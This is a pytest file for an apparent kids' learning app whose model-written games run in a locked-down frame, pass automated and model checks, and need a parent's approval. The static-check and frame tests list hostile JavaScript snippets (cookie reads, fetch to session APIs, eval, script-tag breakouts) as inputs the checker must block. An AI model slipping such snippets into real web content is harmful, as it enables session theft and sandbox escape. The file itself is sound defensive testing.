"""Generated games run only in a locked frame, pass a robot, and wait for a person."""
import asyncio
import json
import os
import uuid

import pytest

from backend import main
from backend.games import checks, frame, library, prompts, service
from backend.games.models import GameDraft, GameReview
from backend.games.pipeline import build_game
from backend.games.robot import RobotUnavailable, failures, play, run_robot
from backend.gap.catalog import seed_catalog
from backend.gap.service import record_homework_evidence
from backend.tests.account_helpers import create_child, mutate, picker, select_child, setup_pin, signup, unlock

EXAMPLES = {item['slug']: item for item in prompts.load_examples()}
SHIPPED = {item['slug']: item for item in prompts.load_library()}
LIBRARY = {slug: item for slug, item in SHIPPED.items() if slug not in EXAMPLES}
FROG = EXAMPLES['froggys-bridge']['code']
PASSING = {'passed': True, 'kit': 'kit-1', 'stats': {}, 'manifest': {'rounds': [{'id': 'a', 'phase': 'solo', 'say': 'Go', 'mistakes': [{'tag': 't'}]}]},
           'checks': [{'name': 'boots', 'ok': True, 'detail': ''}]}


def key():
    return uuid.uuid4().hex


def failing(name, detail='nope'):
    return {'passed': False, 'kit': 'kit-1', 'stats': {}, 'manifest': None, 'checks': [{'name': name, 'ok': False, 'detail': detail}]}


def draft(code=FROG, title="Froggy's Bridge"):
    return GameDraft(ideas=['one idea', 'another idea', 'a third idea'], chosen=0, title=title, emoji='🐸',
                     premise='Build a bridge that stops right at the berry.', idea='The gap is one whole and planks are unit fractions.', code=code, css='')


def review(ok=True, notes=()):
    """A review with no defect, or with one. Notes ride along either way and never stop a game."""
    return GameReview(conceptIsTheRule=ok, playNotQuiz=True, contentCorrect=ok, kidAppropriate=True, soloIsFresh=True, mistakeIsRealistic=True,
                      blockers=[] if ok else ['Round 2 says three fourths is three planks of any size.'], issues=list(notes))


class FakeAdapter:
    model = 'fake-model'

    def __init__(self, drafts, reviews=None):
        self.drafts, self.reviews, self.calls, self.seen, self.stages, self.earlier = list(drafts), list(reviews or [review()]), [], [], [], []

    async def draft(self, subskill, examples, context=None):
        self.calls.append('draft'); self.seen.append(prompts.draft_user(subskill, context))
        return self.drafts.pop(0)

    async def repair(self, subskill, examples, current, problems, stage='robot'):
        self.calls.append('repair'); self.seen.append(prompts.repair_user(subskill, current, problems)); self.stages.append(stage)
        return self.drafts.pop(0)

    async def review(self, subskill, current, manifest, earlier=None):
        self.calls.append('review'); self.earlier.append(list(earlier or []))
        return self.reviews.pop(0)


SKILL = {'subskill_id': '3.NF.A.1-2', 'subskill': 'Know a/b is a copies of 1/b', 'subject': 'Math', 'grade': '3', 'common_misconception': 'Sees 3/4 as two numbers'}


@pytest.fixture
def games_on(monkeypatch):
    monkeypatch.setenv('SIDEKICK_GAMES_ENABLED', 'true')
    monkeypatch.setenv('SIDEKICK_GAMES_REQUIRE_APPROVAL', 'true')
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'false')
    monkeypatch.setenv('SIDEKICK_GAMES_PREMADE', 'true')
    monkeypatch.delenv('SIDEKICK_GAME_REVIEWERS', raising=False)


@pytest.fixture
def family(parent_client, security_context):
    seed_catalog(security_context.db)
    child = create_child(parent_client).json()
    select_child(parent_client, child['id'])
    return child, parent_client


def upload(security, child, subskill='3.NF.A.1-2'):
    upload_id, problem_id, now = key(), key(), security.clock.now()
    with security.db.transaction() as conn:
        conn.execute("INSERT INTO homework_uploads(id,kid_id,content_hash,file_ref,mime,pages_json,source,state,stage,created_at,updated_at) VALUES(?,?,?,'opaque','image/png','[]','fixture','completed','completed',?,?)", (upload_id, child['id'], key(), now, now))
        conn.execute("INSERT INTO homework_problems(id,upload_id,kid_id,page_number,problem_order,printed_id,extraction_json,context_json,fingerprint,teacher_conflict,created_at) VALUES(?,?,?,1,0,'1','{}','[]',?,0,?)", (problem_id, upload_id, child['id'], key(), now))
    record_homework_evidence(security, child['id'], problem_id, subskill, 'incorrect', True, .99, question='Private homework wording.', fingerprint=key())
    return upload_id


def store(security, *, status='verified', code=FROG, subskill='3.NF.A.1-2', origin='seed_example'):
    from backend.gap.catalog import get_subskill
    with security.db.transaction() as conn:
        version_id, _ = library.save_version(conn, security.clock.now(), get_subskill(conn, subskill), title="Froggy's Bridge", emoji='🐸', premise='Build a bridge to the berry.',
                                             idea='Planks are unit fractions.', code=code, css='', report=PASSING, review=None, origin=origin, model='test', status=status)
    return version_id


# ------------------------------------------------------------------ static checks and the frame

def test_reference_games_pass_static_checks_and_bad_source_is_named():
    assert len(EXAMPLES) >= 4
    for item in EXAMPLES.values():
        assert checks.static_issues(item['code'], item['css']) == [], item['slug']
    bad = {
        "fetch('/api/session')": 'network', 'new WebSocket(u)': 'network', 'eval(x)': 'dynamic_code', 'new Function("a")': 'dynamic_code', 'import("x")': 'dynamic_code',
        'document.cookie': 'storage', 'localStorage.a = 1': 'storage', 'location.href = u': 'navigation', 'window.open(u)': 'navigation',
        'parent.postMessage({}, "*")': 'outside_frame', 'window.__SK.goto(3)': 'outside_frame', 'navigator.userAgent': 'device',
        'el.innerHTML = "<script>x</script>"': 'markup', 'el.innerHTML = "<iframe>"': 'markup', 'el.innerHTML = "<a href=x>"': 'markup',
        'img.src = "https://example.com/a.png"': 'external_url', 'img.src = "//example.com/a.png"': 'external_url', 'alert(1)': 'dialog',
        'document.createElement("input")': 'free_text_input', 'while (true) {}': 'runaway', 'setInterval(f, 1)': 'runaway',
    }
    for snippet, reason in bad.items():
        assert reason in checks.static_issues('Sidekick.game({});\n' + snippet), snippet
    # Ordinary code and ordinary sentences are left alone. Each of these once stopped a good game.
    fine = ['for (let i = 0; i < a; i++) {}', 'if (ones < base) {}', 'for(let i=0;i<a;i++){}', 'if (count < select.value) {}',
            'items.forEach(function (x) { return x; });', "say: 'Stack the blocks to the top. Then jump.'",
            "say: 'It is the tallest tower in history.'", "read: 'Some countries import fruit from far away.'"]
    for snippet in fine:
        assert checks.static_issues('Sidekick.game({});\n' + snippet) == [], snippet
    still_bad = {'Function("a")()': 'dynamic_code', 'import x from "y"': 'dynamic_code', 'top.hacked = 1': 'navigation', 'const d = top.document;': 'navigation',
                 'top["x"] = 1': 'navigation', 'history.back()': 'navigation', 'el.innerHTML = "<a>"': 'markup', 'el.innerHTML = "<textarea>"': 'free_text_input'}
    for snippet, reason in still_bad.items():
        assert reason in checks.static_issues('Sidekick.game({});\n' + snippet), snippet
    # The writer is told what a reason means and what tripped it, so one repair can fix it.
    told = checks.explain("Sidekick.game({});\nsay: 'Drag the flag to the right location.'")
    assert len(told) == 1 and told[0].startswith('static_checks: navigation.') and '"spot"' in told[0] and 'right location' in told[0]
    assert checks.explain(FROG) == []
    assert checks.static_issues('var x = 1;') == ['must_call_sidekick_game_once']
    assert checks.static_issues('Sidekick.game({}); Sidekick.game({});') == ['must_call_sidekick_game_once']
    assert 'code_too_large' in checks.static_issues('Sidekick.game({});' + ' ' * 70_000)
    assert checks.static_issues('Sidekick.game({});', 'body { background: url(x) }') == ['css_external_url']
    assert checks.static_issues('') == ['empty_code']


def test_frame_is_self_contained_and_locked_down():
    html, nonce = frame.build_document(FROG, seed=7, token='tok_' + 'a' * 20)
    headers = frame.frame_headers(nonce)
    policy = headers['Content-Security-Policy']
    for part in ["default-src 'none'", f"script-src 'nonce-{nonce}'", "connect-src 'none'", "form-action 'none'", "base-uri 'none'", "frame-src 'none'",
                 'sandbox allow-scripts', "frame-ancestors 'self'"]:
        assert part in policy
    assert 'allow-same-origin' not in policy and 'unsafe-eval' not in policy and "script-src 'unsafe-inline'" not in policy
    assert headers['X-Content-Type-Options'] == 'nosniff' and headers['Cache-Control'] == 'no-store'
    assert html.count(f'<script nonce="{nonce}">') == 3 and '<script>' not in html
    assert '__SK_FONT_' not in html and '__SK_MASCOT__' not in html and '__SK_MESSAGE_TOKEN__' not in html
    assert 'tok_' + 'a' * 20 in html and '"seed": 7' in html
    # Nothing in the document points at the network.
    assert 'src="http' not in html and 'href=' not in html and '@import' not in html
    assert frame.build_document(FROG)[1] != nonce
    with pytest.raises(ValueError):
        frame.build_document(FROG, token='bad"token')
    # Even source that slipped past the checks cannot close its script tag or its style tag.
    escaped, _ = frame.build_document(FROG + "\nvar x = '</script><script>top.hacked=1</script><!--';")
    assert escaped.count('</script>') == 3 and '<!--' not in escaped
    with pytest.raises(ValueError):
        frame.build_document(FROG, 'body{}</style><script>1</script>')


def test_prompt_carries_curriculum_only_and_never_shows_the_target_skill_as_an_example():
    subskill = {**SKILL, 'kid_id': 'kid-123', 'first_name': 'Alex', 'email': 'parent@example.com', 'p1_q': 'How many 1/4 pieces make 3/4?'}
    payload = prompts.draft_user(subskill)
    text = str(payload)
    assert 'kid-123' not in text and 'Alex' not in text and 'parent@example.com' not in text
    assert payload['skill']['subskill_id'] == '3.NF.A.1-2'
    picked = prompts.pick_examples(subskill, list(EXAMPLES.values()))
    assert len(picked) == 2 and all(item['subskillId'] != '3.NF.A.1-2' for item in picked)
    assert {('L.' in item['subskillId']) for item in picked} == {True, False}
    system = prompts.draft_system(picked)
    assert 'play, not a quiz' in system and 'Sidekick.game' in system and 'What the robot proves' in system


# ------------------------------------------------------------------ the build pipeline

def test_pipeline_repairs_from_the_robot_report_then_reviews():
    reports = [failing('round_1_solution_wins', 'the game said: Not yet'), PASSING]
    adapter = FakeAdapter([draft(), draft()])
    result = asyncio.run(build_game(SKILL, adapter, examples=list(EXAMPLES.values()), robot=lambda code, css: reports.pop(0)))
    assert result.ok and adapter.calls == ['draft', 'repair', 'review'] and result.robot_runs == 2 and result.model_calls == 3
    assert adapter.seen[1]['problems'] == ['round_1_solution_wins: the game said: Not yet']


def test_pipeline_never_runs_source_that_fails_static_checks():
    ran = []
    adapter = FakeAdapter([draft(FROG + "\nfetch('/api/session');"), draft(FROG + '\neval("1");'), draft(FROG + '\nfetch(1);'), draft(FROG + '\nalert(1);')])
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: ran.append(code) or PASSING))
    assert not result.ok and ran == [] and adapter.calls == ['draft', 'repair', 'repair', 'repair']
    assert result.reasons() == ['static_checks: dialog'] and [item['stage'] for item in result.history] == ['static'] * 4
    # The writer hears what the reason means. The stored history keeps only the reason code.
    assert adapter.seen[1]['problems'][0].startswith('static_checks: network. Games have no network.')


def test_pipeline_stops_after_bounded_repairs_and_bounded_rewrites():
    adapter = FakeAdapter([draft()] * 4)
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: failing('fits_phone')))
    assert not result.ok and adapter.calls == ['draft', 'repair', 'repair', 'repair'] and result.robot_runs == 4
    adapter = FakeAdapter([draft()] * 3, [review(False)] * 3)
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: PASSING))
    assert not result.ok and adapter.calls == ['draft', 'review', 'repair', 'review', 'repair', 'review'] and adapter.stages == ['review', 'review']
    assert result.reasons() == ['review: Round 2 says three fourths is three planks of any size.']
    # A robot repair and a reviewer rewrite draw on separate budgets.
    reports = [failing('fits_phone'), PASSING, PASSING]
    adapter = FakeAdapter([draft()] * 3, [review(False), review()])
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: reports.pop(0)))
    assert result.ok and adapter.calls == ['draft', 'repair', 'review', 'repair', 'review'] and adapter.stages == ['robot', 'review']


def test_reviewer_stops_defects_only_and_checks_its_own_earlier_ones():
    # Notes are for the person who reviews. They ride along and never stop a game.
    quiz_like = GameReview(conceptIsTheRule=False, playNotQuiz=False, contentCorrect=True, kidAppropriate=True, soloIsFresh=False, mistakeIsRealistic=False,
                           issues=['Plays like a quiz.', 'The last round reuses 3/4.'])
    assert quiz_like.passed()
    adapter = FakeAdapter([draft()], [quiz_like])
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: PASSING))
    assert result.ok and adapter.calls == ['draft', 'review'] and result.review.issues == ['Plays like a quiz.', 'The last round reuses 3/4.']
    # Something false stops it, with or without a written blocker.
    assert not GameReview(conceptIsTheRule=True, playNotQuiz=True, contentCorrect=False, kidAppropriate=True, soloIsFresh=True, mistakeIsRealistic=True).passed()
    assert not GameReview(conceptIsTheRule=True, playNotQuiz=True, contentCorrect=True, kidAppropriate=False, soloIsFresh=True, mistakeIsRealistic=True).passed()
    # After a rewrite the reviewer is handed what it asked for, so it checks the fix instead of starting over.
    adapter = FakeAdapter([draft(), draft()], [review(False, notes=['A note.']), review()])
    result = asyncio.run(build_game(SKILL, adapter, examples=[], robot=lambda code, css: PASSING))
    assert result.ok and adapter.calls == ['draft', 'review', 'repair', 'review']
    assert adapter.earlier == [[], ['Round 2 says three fourths is three planks of any size.']]
    # The rewrite is asked to fix the defect, not the notes.
    assert adapter.seen[1]['problems'] == ['review: Round 2 says three fourths is three planks of any size.']
    assert 'earlierBlockers' not in prompts.review_user(SKILL, draft(), PASSING['manifest'])
    assert prompts.review_user(SKILL, draft(), PASSING['manifest'], ['Fix round 2.'])['earlierBlockers'] == ['Fix round 2.']


def test_only_robot_passed_games_can_be_stored(family, security_context):
    from backend.gap.catalog import get_subskill
    with security_context.db.transaction() as conn:
        with pytest.raises(ValueError):
            library.save_version(conn, 1.0, get_subskill(conn, '3.NF.A.1-2'), title='T', emoji='x', premise='p', idea='i', code=FROG, css='',
                                 report=failing('boots'), review=None, origin='model_generated', model='m')
    first, again = store(security_context), store(security_context)
    assert first == again


def test_seed_examples_wait_for_review_and_skip_games_the_robot_rejects(family, security_context):
    seen = []

    def robot(code, css):
        seen.append(code)
        return failing('boots') if 'Choco Factory' in code else PASSING
    report = library.seed_examples(security_context.db, 5.0, robot=robot)
    assert {item['slug']: item['result'] for item in report}['choco-factory'] == 'robot_failed'
    with security_context.db.transaction() as conn:
        rows = conn.execute('SELECT status,origin FROM game_versions').fetchall()
    assert len(rows) == len(SHIPPED) - 1 and all(row['status'] == 'verified' and row['origin'] == 'seed_example' for row in rows)
    assert all(item['result'] in {'unchanged', 'robot_failed'} for item in library.seed_examples(security_context.db, 6.0, robot=robot))


def test_every_grade_in_the_skill_map_has_a_game_grade_number():
    catalog = json.loads((prompts.ROOT / 'data' / 'sidekick_skill_map_v2.json').read_text(encoding='utf-8'))
    numbers = {str(item['grade']): library.grade_number(item) for item in catalog}
    assert all(number is not None and 0 <= number <= 12 for number in numbers.values()), numbers
    assert numbers['K'] == 0 and numbers['8'] == 8 and numbers['Algebra 1'] == 9 and numbers['Geometry'] == 10
    assert numbers['Algebra 2'] == 11 and numbers['Precalculus / advanced (+)'] == 12 and numbers['9-10'] == 9 and numbers['11-12'] == 11
    assert library.grade_number({'grade': 'College'}) is None and library.grade_number({}) is None


def test_seeding_can_be_narrowed_run_in_parallel_and_resumed(family, security_context):
    catalog = {item['subskill_id']: item for item in json.loads((prompts.ROOT / 'data' / 'sidekick_skill_map_v2.json').read_text(encoding='utf-8'))}
    k_math = {slug for slug, game in SHIPPED.items() if catalog[game['subskillId']]['subject'] == 'Math' and str(catalog[game['subskillId']]['grade']) == 'K'}
    assert len(k_math) >= 5
    plays, heard = [], []

    def robot(code, css):
        plays.append(code)
        return PASSING
    first = library.seed_examples(security_context.db, 5.0, robot=robot, subject='math', grades=['K'], workers=3, progress=heard.append)
    assert {item['slug'] for item in first} == k_math and all(item['result'] == 'added' for item in first)
    assert len(plays) == len(k_math) and heard == first
    # A repeat run finds everything stored and never starts the robot.
    again = library.seed_examples(security_context.db, 6.0, robot=robot, subject='math', grades=['K'], workers=3)
    assert all(item['result'] == 'unchanged' for item in again) and len(plays) == len(k_math)
    # A limit caps robot runs, and `only` names single folders.
    some = library.seed_examples(security_context.db, 7.0, robot=robot, subject='ela', grades=['1'], limit=4)
    assert [item['result'] for item in some] == ['added'] * 4
    one = library.seed_examples(security_context.db, 8.0, robot=robot, only=['froggys-bridge'])
    assert [(item['slug'], item['result']) for item in one] == [('froggys-bridge', 'added')]
    with security_context.db.transaction() as conn:
        assert conn.execute('SELECT COUNT(*) FROM game_versions').fetchone()[0] == len(k_math) + 5


def test_high_school_games_are_stored_and_offered(family, security_context, games_on):
    child, client = family
    game = next(item for item in SHIPPED.values() if item['subskillId'] == 'A-APR.B.2-1')
    report = library.seed_examples(security_context.db, 5.0, robot=lambda code, css: PASSING, only=[game['slug']], approve=True)
    assert report[0]['result'] == 'added'
    with security_context.db.transaction() as conn:
        row = conn.execute('SELECT grade,subject,status FROM game_versions WHERE id=?', (report[0]['id'],)).fetchone()
    assert (row['grade'], row['subject'], row['status']) == (11, 'math', 'approved')
    upload_id = upload(security_context, child, subskill='A-APR.B.2-1')
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['state'] == 'ready' and view['game']['title'] == game['title'] and view['targetSkill']['id'] == 'A-APR.B.2-1'


def test_review_list_filters_searches_pages_and_counts(family, security_context, games_on):
    child, client = family
    robot = lambda code, css: PASSING  # noqa: E731
    library.seed_examples(security_context.db, 5.0, robot=robot, subject='math', grades=['K'])
    library.seed_examples(security_context.db, 5.0, robot=robot, subject='ela', grades=['9-10'], limit=7)
    library.seed_examples(security_context.db, 5.0, robot=robot, subject='math', grades=['Algebra 1'], limit=3)
    picker(client); unlock(client)
    with security_context.db.transaction() as conn:
        k_math = conn.execute("SELECT COUNT(*) FROM game_versions WHERE subject='math' AND grade=0").fetchone()[0]
    total = k_math + 10
    page = client.get('/api/games/review').json()
    assert page['total'] == total and page['limit'] == 50 and page['offset'] == 0 and len(page['games']) == 50
    assert page['counts'] == {'verified': total, 'approved': 0, 'retired': 0}
    # Math comes first, in grade order, so a reviewer can work through one grade at a time.
    assert all(game['subject'] == 'math' and game['gradeLabel'] == 'K' for game in page['games'])
    rest = client.get('/api/games/review', params={'offset': 50, 'limit': 100}).json()
    assert len(rest['games']) == total - 50 and rest['games'][-1]['gradeLabel'] == '9-10'
    assert {game['id'] for game in page['games']}.isdisjoint(game['id'] for game in rest['games'])
    assert {(item['subject'], item['grade'], item['waiting']) for item in page['grades']} == {('math', 'K', k_math), ('math', 'Algebra 1', 3), ('ela', '9-10', 7)}
    # Filters narrow the list. The counts beside the tabs stay whole.
    ela = client.get('/api/games/review', params={'subject': 'ela'}).json()
    assert ela['total'] == 7 and all(game['subject'] == 'ela' for game in ela['games']) and ela['counts']['verified'] == total
    algebra = client.get('/api/games/review', params={'grade': 'Algebra 1'}).json()
    assert algebra['total'] == 3 and all(game['gradeLabel'] == 'Algebra 1' and game['grade'] == 9 for game in algebra['games'])
    target = algebra['games'][0]
    by_skill = client.get('/api/games/review', params={'q': target['targetSkill']['id']}).json()
    assert target['id'] in {game['id'] for game in by_skill['games']} and by_skill['total'] < total
    by_title = client.get('/api/games/review', params={'q': target['title']}).json()
    assert [game['id'] for game in by_title['games']] == [target['id']]
    assert client.get('/api/games/review', params={'q': '100%_nothing'}).json()['total'] == 0
    # Deciding moves a game between tabs.
    assert mutate(client, 'POST', f"/api/games/review/{target['id']}/decision", json={'decision': 'approve'}).status_code == 200
    assert client.get('/api/games/review', params={'grade': 'Algebra 1'}).json()['total'] == 2
    live = client.get('/api/games/review', params={'status': 'approved'}).json()
    assert [game['id'] for game in live['games']] == [target['id']] and live['counts'] == {'verified': total - 1, 'approved': 1, 'retired': 0}
    assert client.get('/api/games/review', params={'status': 'all'}).json()['total'] == total
    assert client.get('/api/games/review', params={'limit': 5000, 'offset': -3}).json()['limit'] == 100


# ------------------------------------------------------------------ play, privacy and the review gate

def test_games_are_on_unless_switched_off_and_approval_stays_required(family, security_context, monkeypatch):
    for name in ('SIDEKICK_GAMES_ENABLED', 'SIDEKICK_GAMES_REQUIRE_APPROVAL', 'SIDEKICK_GAMES_AUTOGENERATE', 'SIDEKICK_GAMES_PREMADE'):
        monkeypatch.delenv(name, raising=False)
    settings = service.GameSettings.from_env()
    assert settings.enabled and settings.require_approval and not settings.autogenerate and settings.premade
    child, client = family
    upload_id = upload(security_context, child)
    version_id = store(security_context)
    # On by default, and a game nobody approved is still not offered.
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['enabled'] is True and view['state'] == 'in_review' and view['game'] is None
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).status_code == 409
    with security_context.db.transaction() as conn:
        conn.execute("UPDATE game_versions SET status='approved' WHERE id=?", (version_id,))
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()['state'] == 'ready'
    # The switch turns the whole thing off.
    monkeypatch.setenv('SIDEKICK_GAMES_ENABLED', 'false')
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['enabled'] is False and view['state'] == 'off' and view['game'] is None
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).status_code == 404


def test_a_game_reaches_a_child_only_after_a_person_approves_it(family, security_context, games_on):
    child, client = family
    upload_id = upload(security_context, child)
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()['state'] == 'none'
    version_id = store(security_context)
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['state'] == 'in_review' and view['game'] is None and view['canRequest'] is False
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).status_code == 409
    # The review pages need the parent PIN, never the child's session.
    assert client.get('/api/games/review').status_code == 403
    assert mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'approve'}).status_code == 403
    picker(client); unlock(client)
    listing = client.get('/api/games/review').json()
    assert [game['status'] for game in listing['games']] == ['verified'] and listing['requireApproval'] is True
    detail = client.get(f'/api/games/review/{version_id}').json()
    assert 'Sidekick.game' in detail['code'] and detail['robot']['passed'] is True
    assert client.post(f'/api/games/review/{version_id}/decision', json={'decision': 'approve'}, headers={'Origin': 'http://testserver'}).status_code == 403
    approved = mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'approve', 'note': 'Played it twice.'}).json()
    assert approved['status'] == 'approved' and approved['decisionNote'] == 'Played it twice.'
    select_child(client, child['id'])
    view = client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()
    assert view['state'] == 'ready' and view['game']['title'] == "Froggy's Bridge" and view['targetSkill']['id'] == '3.NF.A.1-2'
    # Retiring takes it away again, and a retired game cannot be brought back.
    picker(client); unlock(client)
    assert mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'retire'}).json()['status'] == 'retired'
    assert mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'approve'}).status_code == 409
    select_child(client, child['id'])
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()['state'] == 'none'


def test_premade_games_can_be_switched_off_everywhere_and_come_straight_back(family, security_context, games_on, monkeypatch):
    child, client = family
    upload_id = upload(security_context, child)
    shipped = store(security_context, status='approved')
    suggestion = lambda: client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).json()  # noqa: E731
    assert service.GameSettings.from_env().premade is True and suggestion()['state'] == 'ready'
    monkeypatch.delenv('SIDEKICK_GAMES_PREMADE', raising=False); assert service.GameSettings.from_env().premade is True   # on unless switched off
    # Off: the shipped game is not offered, and it does not hold the skill as "waiting for review" either.
    monkeypatch.setenv('SIDEKICK_GAMES_PREMADE', 'false')
    view = suggestion()
    assert view['state'] == 'none' and view['game'] is None
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).status_code == 409
    # So a model-written game can be asked for, even though a shipped one exists for the same skill.
    monkeypatch.setenv('SIDEKICK_GAMES_AUTOGENERATE', 'true'); monkeypatch.setenv('VISION_API_KEY', 'k'); monkeypatch.setenv('VISION_MODEL', 'm')
    assert suggestion()['canRequest'] is True
    monkeypatch.setitem(main.app.state._state, 'game_adapter', FakeAdapter([draft(FROG + '\n// written by the model')]))
    monkeypatch.setitem(main.app.state._state, 'game_robot', lambda code, css: PASSING)
    assert mutate(client, 'POST', '/api/games/kid/request', json={'uploadId': upload_id}).json() == {'queued': True, 'state': 'building'}
    assert suggestion()['state'] == 'in_review'
    # Reviewers see only what the model wrote, in the list and in every count.
    picker(client); unlock(client)
    page = client.get('/api/games/review', params={'status': 'all'}).json()
    assert page['premade'] is False and [game['origin'] for game in page['games']] == ['model_generated'] and page['total'] == 1
    assert page['counts'] == {'verified': 1, 'approved': 0, 'retired': 0} and [item['total'] for item in page['grades']] == [1]
    assert client.get('/api/games/review/me').json()['waiting'] == 1
    written = page['games'][0]['id']
    assert mutate(client, 'POST', f'/api/games/review/{written}/decision', json={'decision': 'approve'}).status_code == 200
    select_child(client, child['id'])
    assert suggestion()['game']['id'] == written
    # On again: nothing was deleted, so the shipped game is back at once, beside the model's.
    monkeypatch.setenv('SIDEKICK_GAMES_PREMADE', 'true')
    picker(client); unlock(client)
    page = client.get('/api/games/review', params={'status': 'all'}).json()
    assert page['premade'] is True and {game['id'] for game in page['games']} == {shipped, written}


def test_production_review_needs_a_listed_reviewer(family, security_context, games_on, monkeypatch):
    child, client = family
    version_id = store(security_context)
    picker(client); unlock(client)
    # Settings are frozen; flip the environment in place and let monkeypatch put it back.
    monkeypatch.setattr(type(security_context.settings), '__setattr__', object.__setattr__)
    monkeypatch.setattr(security_context.settings, 'app_env', 'production')
    assert client.get('/api/games/review').status_code == 403
    assert client.get('/api/games/review/me').json() == {'reviewer': False, 'enabled': True}
    assert mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'approve'}).status_code == 403
    monkeypatch.setenv('SIDEKICK_GAME_REVIEWERS', 'someone@else.test, Parent@Example.com')
    assert client.get('/api/games/review/me').json()['reviewer'] is True
    assert mutate(client, 'POST', f'/api/games/review/{version_id}/decision', json={'decision': 'approve'}).status_code == 200


def test_playground_switch_is_off_unless_set_and_is_only_told_to_reviewers(family, security_context, games_on, monkeypatch):
    child, client = family
    picker(client); unlock(client)
    monkeypatch.delenv('SIDEKICK_GAMES_PLAYGROUND', raising=False)
    assert client.get('/api/games/review/me').json()['playground'] is False
    monkeypatch.setenv('SIDEKICK_GAMES_PLAYGROUND', 'true')
    assert client.get('/api/games/review/me').json()['playground'] is True
    # The switch only shows a page. Someone who may not review learns nothing about it.
    monkeypatch.setattr(type(security_context.settings), '__setattr__', object.__setattr__)
    monkeypatch.setattr(security_context.settings, 'app_env', 'production')
    assert 'playground' not in client.get('/api/games/review/me').json()


def test_play_frame_finish_and_parent_history(family, security_context, games_on):
    child, client = family
    upload_id = upload(security_context, child)
    version_id = store(security_context, status='approved')
    request_key = key()
    assert client.post('/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': request_key}, headers={'Origin': 'http://testserver'}).status_code == 403
    run = mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': request_key}).json()
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': request_key}).json()['id'] == run['id']
    assert run['status'] == 'in_progress' and run['game']['id'] == version_id and len(run['messageToken']) >= 24

    page = client.get(f"/api/games/kid/runs/{run['id']}/frame")
    assert page.status_code == 200 and page.headers['content-type'].startswith('text/html')
    assert 'sandbox allow-scripts' in page.headers['content-security-policy'] and "connect-src 'none'" in page.headers['content-security-policy']
    assert page.headers['cache-control'] == 'no-store' and run['messageToken'] in page.text
    # The frame holds the game and nothing about the family.
    for private in (child['id'], child['firstName'], 'parent@example.com', upload_id, 'Private homework wording', run['id']):
        assert private not in page.text

    result = {'rounds': [{'id': 'a', 'phase': 'guided', 'attempts': 2, 'hints': 1, 'solved': True, 'firstTry': False, 'mistakes': ['bottom_number_as_count']},
                         {'id': 'b', 'phase': 'solo', 'attempts': 1, 'hints': 0, 'solved': True, 'firstTry': True, 'mistakes': []}],
              'solo': {'solved': True, 'firstTry': True, 'attempts': 1, 'mistakes': []}, 'ms': 61000}
    path = f"/api/games/kid/runs/{run['id']}/finish"
    assert mutate(client, 'POST', path, json={'token': 'x' * 32, 'result': result}).status_code == 400
    assert mutate(client, 'POST', path, json={'token': run['messageToken'], 'result': {**result, 'extra': 1}}).status_code == 400
    done = mutate(client, 'POST', path, json={'token': run['messageToken'], 'result': result}).json()
    assert done['status'] == 'completed' and done['result']['solo']['firstTry'] is True
    # First finish wins.
    changed = {**result, 'solo': {'solved': False, 'firstTry': False, 'attempts': 9, 'mistakes': []}}
    assert mutate(client, 'POST', path, json={'token': run['messageToken'], 'result': changed}).json()['result']['solo']['firstTry'] is True

    # Play is practice: it records a result for the parent and leaves skill states and evidence alone.
    with security_context.db.transaction() as conn:
        assert conn.execute("SELECT COUNT(*) FROM learning_evidence WHERE source!='homework'").fetchone()[0] == 0
    assert client.get(f"/api/games/parent/{child['id']}/history").status_code == 403
    picker(client); unlock(client)
    history = client.get(f"/api/games/parent/{child['id']}/history").json()
    assert history['runs'][0]['title'] == "Froggy's Bridge" and history['runs'][0]['solo'] == {'solved': True, 'firstTry': True, 'attempts': 1, 'mistakes': []}
    assert history['runs'][0]['hints'] == 1


def test_sibling_and_other_account_cannot_reach_a_run(family, security_context, games_on, client_factory):
    child, client = family
    upload_id = upload(security_context, child)
    store(security_context, status='approved')
    run = mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).json()
    path = f"/api/games/kid/runs/{run['id']}"
    picker(client); unlock(client)
    assert client.get(path).status_code == 403 and client.get(path + '/frame').status_code == 403
    sibling = create_child(client, name='Sibling').json()
    select_child(client, sibling['id'])
    assert client.get(path).status_code == 404 and client.get(path + '/frame').status_code == 404
    assert client.get('/api/games/kid/suggestion', params={'uploadId': upload_id}).status_code == 404
    assert mutate(client, 'POST', '/api/games/kid/start', json={'uploadId': upload_id, 'idempotencyKey': key()}).status_code == 404
    assert mutate(client, 'POST', path + '/finish', json={'token': run['messageToken'], 'result': {'rounds': [], 'solo': None, 'ms': 1}}).status_code == 404
    other = client_factory()
